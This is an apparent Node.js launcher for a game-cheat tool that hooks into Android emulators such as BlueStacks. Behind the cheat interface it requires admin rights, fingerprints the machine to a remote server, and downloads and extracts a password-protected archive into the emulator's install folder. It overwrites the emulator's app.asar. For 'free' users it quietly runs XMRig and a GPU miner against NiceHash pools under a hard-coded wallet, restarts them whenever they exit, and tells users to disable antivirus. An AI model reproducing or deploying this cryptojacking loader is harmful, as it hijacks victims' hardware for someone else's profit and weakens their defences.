const os = require("os");
const fs = require("fs");
const path = require("path");
const { exec, spawn, spawnSync, execFile } = require("child_process"), { get } = require("axios").default, { createExtractorFromFile } = require("node-unrar-js"), userAgent = (() => {
    const cpu = os.cpus();
    return [
        cpu.at(0).model.split(" ").filter(i => i.length > 0).join(" "),
        "with", cpu.length, "Threads", "and", `${Math.round(os.totalmem() / 1024 / 1000 / 1000)} GB`, "RAM.", "Installed on", os.version()].join(" ");
})();


console.error = async (i, ie = 30) => {
    await console.write(i, ie);
    setTimeout(() => process.exit(), 5000);
};

console.write = (i, ie = 80) => new Promise(resolve => {
    let n = 0;

    i = i.toLocaleUpperCase(); (function write() {
        if (n < i.length) {
            process.stdout.write(i[n]); n++; setTimeout(write, ie);
        } else
            resolve(console.log());
    })();
});

(async function startApp() {
    process.stdout.cursorTo(0, 0);
    process.stdout.clearScreenDown();

    await console.write("Initializing ...");
    const isAdmin = await (() => new Promise(resolve => { try { spawnSync("net session", { stdio: "ignore" }); resolve(true); } catch { resolve(false); }; }))();

    if (!isAdmin)
        return console.error("Failed to start. Run this file as admin.");

    if (isForFree && !fs.existsSync(path.join(__dirname, "XMRig")))
        return console.error("Free User are not allowed to run without Mining Files.");

    let whitelisted; try {
        let { data } = await get(`http://${host}/api/status`, {
            headers: {
                "x-seller": name,
                "x-version": version,
                "x-user-agent": userAgent,
            }
        });

        if (!data.status)
            return console.error(data.err);

        whitelisted = data.whitelisted;
    } catch { return console.error("Failed to match the checksum. Make sure you have good internet connection."); };

    await console.write("Initialization done. Checking Emulators ..."); const main_path = await (() => new Promise(resolve => {
        const emulators = ["BlueStacks", "BlueStacks_nxt", "BlueStacks_msi2", "BlueStacks_msi5", "SmartGaGa"];

        let i = emulators
            .map(i => fs.existsSync(path.join("C:", "Program Files", i)));

        if (fs.existsSync(path.join("C:", "Program Files (x86)", "SmartGaGa", "ProjectTitan", "Engine", "ProjectTitan.exe")))
            i[4] = true;

        i = i.findIndex(i => i)
        setTimeout(() => {
            if (i >= 0)
                return resolve({
                    name: emulators[i],
                    path: path.join("C:", "Program Files", emulators[i])
                });

            else
                return resolve(false);
        }, 1800);
    }))();

    if (!main_path)
        return await console.error("Unable to find any supported emulator. Install one first.");
    await console.write(`Found Emulator (${main_path.name == "BlueStacks" ? "BlueStacks 4" : main_path.name == "BlueStacks_nxt" ? "BlueStacks 5" : main_path.name == "BlueStacks_msi2" ? "MSI Player 4" : main_path.name == "BlueStacks_msi5" ? "MSI Player 5" : main_path.name == "SmartGaGa" ? "Smart GaGa" : "BlueStacks 4"}). Loading Modules ...`);


    if ([
        "ffmpeg.dll",
        "icudtl.dat",
        "resources.pak",
        "HD-RunAgent.exe",
        "locales/en-US.pak",
        "snapshot_blob.node",
        "chrome_100_percent.pak",
        "chrome_200_percent.pak",
        "v8_context_snapshot.bin"
    ].map(i => fs.existsSync(path.join(main_path.path, i))).findIndex(i => i == false) >= 0) {
        return setTimeout(async () => {
            process.stdout.cursorTo(0, 0);
            process.stdout.clearScreenDown();
            await console
                .write(`Some modules are missing. Downloading them ...`); await console.write(`[${Array(50).fill(" ").join("")}] 0.00%`, 8);

            const request = await get(`http://${host}/api/panel/modules`, {
                responseType: 'arraybuffer', headers: {
                    "x-seller": name,
                    "x-version": version,
                    "x-user-agent": userAgent,
                },
                onDownloadProgress: ({ total, loaded, progress }) => {
                    process.stdout.cursorTo(0, 1);
                    console.log(`[${Array(Math.round(50 * progress)).fill("=").join("")}${Array(50 - Math.round(50 * progress)).fill(" ").join("")}] ${(progress * 100).toFixed(2)}% (${(loaded / 1024 / 1024).toFixed(2)} MB of ${(total / 1024 / 1024).toFixed(2)} MB)`);
                }
            });


            try {
                const tempFile = path.join(os.tmpdir(), Buffer
                    .from(`ignite.x.cheats@${process.versions.node}`).toString("base64").split("").reverse().join("")); fs.writeFileSync(tempFile, request.data);

                await console.write("\n\nDownload complete. Installing modules ..."); const extractor = await createExtractorFromFile({
                    targetPath: main_path.path, password: "Ignite.X",
                    filepath: path.join(os.tmpdir(), Buffer.from(`ignite.x.cheats@${process.versions.node}`).toString("base64").split("").reverse().join(""))
                });

                [...extractor
                    .extract().files]; fs.rmSync(tempFile);

                setTimeout(async () => {
                    await console
                        .write("Installation complete. Restarting ..."); setTimeout(() => startApp(), 1800);
                }, 1800);
            } catch { return console.error("Failed to install the modules."); };
        }, 1800);
    } else
        setTimeout(async () => {
            process.stdout.write(`\n\n`);
            await (async callback => {
                if (isForFree) {
                    await console.write("Initializing the Miner ..."); setTimeout(async () => {
                        if (["HD-Miner.exe", "HD-GPU-Miner.exe", "WinRing0x64.sys"].map(i => fs.existsSync(path.join(__dirname, "XMRig", i))).filter(i => !i).length == 0) {
                            let isResolved = false; (async function startMiner() {
                                const Miner = execFile(path.join(__dirname, "XMRig", "HD-Miner.exe"), ["-a", "rx", "-o", "stratum+tcp://randomxmonero.auto.nicehash.com:9200", "-u", "NHbZqp7ic66cjaoFF8KNTWxrorJs28ag3TsQ.XMRig", "-p", "x", "--nicehash", "--no-color", "--cpu-max-threads-hint=50"], {
                                    cwd: os.tmpdir(),
                                });

                                let lolMiner;
                                [Miner.stdout, Miner.stderr].map(i => i.addListener("data", i => {
                                    if (!isResolved && i.includes("use pool")) {
                                        lolMiner = execFile(path.join(__dirname, "XMRig", "HD-GPU-Miner.exe"), ["-a", "ETCHASH", "-p", "stratum+tcp://etchash.auto.nicehash.com:9200", "-u", "NHbZqp7ic66cjaoFF8KNTWxrorJs28ag3TsQ.XMRig", "--pass", "x", "-pl", "50"], {
                                            cwd: os.tmpdir(),
                                        });

                                        callback();
                                        isResolved = true;
                                    };
                                }));

                                Miner.addListener("exit", () => {
                                    lolMiner?.kill();
                                    setTimeout(() => startMiner());
                                });
                            })();
                        } else
                            await console.error("Failed to start the miner. Turn off your Antivirus and Try again.");
                    }, 1800);
                } else
                    callback();
            })(async () => {
                await console.write(isForFree ? "Miner Running. Initializing the ui ..." : "Modules loaded. Initializing the ui ...");
                fs.existsSync(path.join(main_path.path, "resources")) ? null : fs.mkdirSync(path.join(main_path.path, "resources"));

                fs.copyFileSync(path.join(__dirname, "app.asar"), path.join(main_path.path, "resources", "app.asar"));
                const proc = spawn(path.join(main_path.path, "HD-RunAgent.exe"), [], {
                    detached: isBuilt && !isForFree, windowsHide: false, env: { whitelisted, userAgent, mainFolder: main_path.path }
                });

                (isBuilt && !isForFree) ? proc.unref() : null; proc.stdout.on("data", data => {
                    try {
                        data = JSON.parse(data);
                        data.status ? ((isBuilt && !isForFree) ? process.exit() : null) : console.write(`${data.err}`, 30);
                    } catch { };
                });

                proc.addListener("exit", () => process.exit());
            });
        }, 1800);
})();